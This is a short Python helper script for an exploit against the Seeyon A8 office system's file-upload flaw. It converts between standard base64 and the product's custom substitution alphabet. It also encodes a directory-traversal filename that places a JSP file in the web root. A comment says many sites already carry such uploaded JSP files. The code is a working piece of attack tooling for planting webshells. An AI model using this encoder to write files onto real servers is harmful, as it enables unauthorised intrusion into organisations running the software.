#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/28 15:04
# @Author  : Goop
# @Site    : 
# @File    : yonsee_A8.py
# @Software: PyCharm
# 发现google上存在很多已被上传名为test123456.jsp的站子
import base64

# 加解密 膜~ from https://paper.seebug.org/964/
a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
# 解密对象c
c = "qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6"
# 解密后的对象d
d = ""
# 需要加密的 如..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\seeyou1234.jsp 文件名好像非得十位
filename = "..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\seeyou1234.jsp"
# 加密后的
filename_ = ""
alen = len(a)
blen = len(b)
fba64 = base64.b64encode(filename.encode())


# 解密为标准的base64编码
def a2b(v):
    for x in range(0, alen):
        if a[x] == v:
            return b[x]


# 将标准的base64编码加密为异形编码
def b2a(v):
    for z in range(0, blen):
        if b[z] == v:
            return a[z]


for i in c:
    d = d + a2b(i)
print("解密后的", base64.b64decode(d))
for i in fba64.decode("utf-8"):
    filename_ = filename_ + b2a(i)
print("加密后的", filename_)
